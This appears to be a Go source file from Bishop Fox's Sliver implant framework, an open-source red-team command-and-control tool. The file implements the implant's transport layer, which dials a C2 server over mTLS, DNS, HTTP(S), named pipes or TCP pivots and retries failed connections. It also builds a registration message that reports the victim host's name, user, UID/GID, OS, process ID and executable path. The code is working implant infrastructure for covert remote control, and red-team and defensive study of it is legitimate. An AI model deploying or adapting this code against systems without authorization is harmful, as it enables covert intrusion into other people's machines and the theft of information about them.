package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"fmt"
	"net"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"time"

	// {{if .Config.MTLSc2Enabled}}

	// {{end}}

	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	consts "github.com/bishopfox/sliver/sliver/constants"
	"github.com/bishopfox/sliver/sliver/version"
)

// Transport - A wrapper around a physical connection, embedding what is necessary to perform
// connection multiplexing, and RPC layer management around these muxed logical streams.
// This allows to have different RPC-able streams for parallel work on an implant.
// Also, these multiplexed streams can be used to route any net.Conn traffic.
// Some transports use an underlying "physical connection" that is not/does not yield a
// net.Conn stream, and are therefore unable to use much of the Transport infrastructure.
type Transport struct {
	ID  uint32
	URL *url.URL // URL is used by Sliver's code for CC servers.

	// conn - A physical connection initiated by/on behalf of this transport.
	// From this conn will be derived one or more streams for different purposes.
	// Sometimes this conn is not a proper physical connection (like yielded by net.Dial)
	// but it nonetheless plays the same role. This conn can be nil if the underlying
	// "physical connection" does not yield a net.Conn.
	Conn net.Conn

	// The RPC layer added around a net.Conn stream, used by implant to talk with the server.
	// It is either setup on top of physical conn, or of a muxed stream.
	// It can be nil if the Transport is tied to a pivoted implant.
	// If the Transport is the ActiveConnection to the C2 server, this cannot
	// be nil, as all underlying transports allow to register a RPC layer.
	C2 *Connection
}

// newTransport - Eventually, we should have all supported transport transports being
// instantiated with this function. It will perform all filtering and setup
// according to the complete URI passed as parameter, and classic templating.
func newTransport(url *url.URL) (t *Transport, err error) {
	t = &Transport{
		ID:  newID(),
		URL: url,
	}
	// {{if .Config.Debug}}
	log.Printf("New transport (CC= %s)", url.String())
	// {{end}}
	return
}

// Start - Launch all components and routines that will handle all specifications above.
func (t *Transport) Start(isSwitch bool) (err error) {

	connectionAttempts := 0

ConnLoop:
	for connectionAttempts < maxErrors {

		// We might have several transport protocols available, while some
		// of which being unable to do stream multiplexing (ex: mTLS + DNS):
		// we directly set up the C2 RPC layer here when needed, and we will
		// skip the mux part below if needed.
		switch t.URL.Scheme {
		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			// {{if .Config.Debug}}
			log.Printf("Connecting -> %s", t.URL.Host)
			// {{end}}

			// lport, err := strconv.Atoi(t.URL.Port())
			// if err != nil {
			//         // {{if .Config.Debug}}
			//         log.Printf("[mtls] Error: failed to parse url.Port%s", t.URL.Host)
			//         // {{end}}
			//         lport = 8888
			// }
			t.C2, err = mtlsConnect(t.URL)
			// t.Conn, err = tlsConnect(t.URL.Hostname(), uint16(lport))
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				connectionAttempts++
			}
			break ConnLoop
			// {{end}} - MTLSc2Enabled
		case "dns":
			// {{if .Config.DNSc2Enabled}}
			t.C2, err = dnsConnect(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[dns] Connection failed: %s", err)
				// {{end}}
				connectionAttempts++
			}
			break ConnLoop
			// {{end}} - DNSc2Enabled
		case "https":
			fallthrough
		case "http":
			// {{if .Config.HTTPc2Enabled}}
			t.C2, err = httpConnect(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[%s] Connection failed: %s", t.URL.Scheme, err.Error())
				// {{end}}
				connectionAttempts++
			}
			break ConnLoop
			// {{end}} - HTTPc2Enabled
		case "namedpipe":
			// {{if .Config.NamePipec2Enabled}}
			t.Conn, err = namePipeDial(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Connection failed: %s", err)
				// {{end}}
				connectionAttempts++
			}
			break ConnLoop
			// {{end}} -NamePipec2Enabled
		case "tcppivot":
			// {{if .Config.TCPPivotc2Enabled}}
			t.C2, err = tcpPivotConnect(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[tcppivot] Connection failed: %s", err)
				// {{end}}
				connectionAttempts++
			}
			break ConnLoop
			// {{end}} -TCPPivotc2Enabled
		default:
			err = fmt.Errorf("Unknown c2 protocol: %s", t.URL.Scheme)
			// {{if .Config.Debug}}
			log.Printf(err.Error())
			// {{end}}
			return
		}
	}

	// {{if .Config.Debug}}
	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
	// {{end}}
	return
}

// Stop - Gracefully shutdowns all components of this transport. The force parameter is used in case
// we have a mux transport, and that we want to kill it even if there are pending streams in it.
func (t *Transport) Stop(force bool) (err error) {

	if t.IsRouting() && !force {
		return
		// return fmt.Errorf("Cannot stop transport: %d streams still opened", t.mux.NumStreams())
	}

	// {{if .Config.Debug}}
	log.Printf("[mux] closing all muxed streams")
	// {{end}}

	// Just check the physical connection is not nil and kill it if necessary.
	if t.Conn != nil {
		// {{if .Config.Debug}}
		log.Printf("killing physical connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
		// {{end}}
		return t.Conn.Close()
	}

	// {{if .Config.Debug}}
	log.Printf("Transport closed (%s)", t.URL.String())
	// {{end}}
	return
}

// IsRouting - The transport checks if it is routing traffic that does not originate from this implant.
func (t *Transport) IsRouting() bool {

	// if t.IsMux {
	//         activeStreams := t.mux.NumStreams()
	//         // If there is an active C2, there is at least one open stream,
	//         // that we do not count as "important" when stopping the Transport.
	//         if (t.C2 != nil && activeStreams > 1) || (t.C2 == nil && activeStreams > 0) {
	//                 return true
	//         }
	//         // Else we don't have any non-implant streams.
	//         return false
	// }
	// If no mux, no routing.
	return false
}

func (t *Transport) registerSliver() *sliverpb.Envelope {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = ""
	}
	currentUser, err := user.Current()
	if err != nil {

		// {{if .Config.Debug}}
		log.Printf("Failed to determine current user %s", err)
		// {{end}}

		// Gracefully error out
		currentUser = &user.User{
			Username: "<< error >>",
			Uid:      "<< error >>",
			Gid:      "<< error >>",
		}

	}
	filename, err := os.Executable()
	// Should not happen, but still...
	if err != nil {
		//TODO: build the absolute path to os.Args[0]
		if 0 < len(os.Args) {
			filename = os.Args[0]
		} else {
			filename = "<< error >>"
		}
	}

	// Additional network info
	var remoteAddr string
	if t.Conn != nil {
		remoteAddr = t.Conn.LocalAddr().String()
	}

	data, err := proto.Marshal(&sliverpb.Register{
		Name:              consts.SliverName,
		Hostname:          hostname,
		Username:          currentUser.Username,
		Uid:               currentUser.Uid,
		Gid:               currentUser.Gid,
		Os:                runtime.GOOS,
		Version:           version.GetVersion(),
		Arch:              runtime.GOARCH,
		Pid:               int32(os.Getpid()),
		Filename:          filename,
		ActiveC2:          t.URL.String(),
		ReconnectInterval: uint32(GetReconnectInterval() / time.Second),
		// Network & transport information.
		Transport:  t.URL.Scheme,
		RemoteAddr: remoteAddr,
	})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to encode register msg %s", err)
		// {{end}}
		return nil
	}
	return &sliverpb.Envelope{
		Type: sliverpb.MsgRegister,
		Data: data,
	}
}
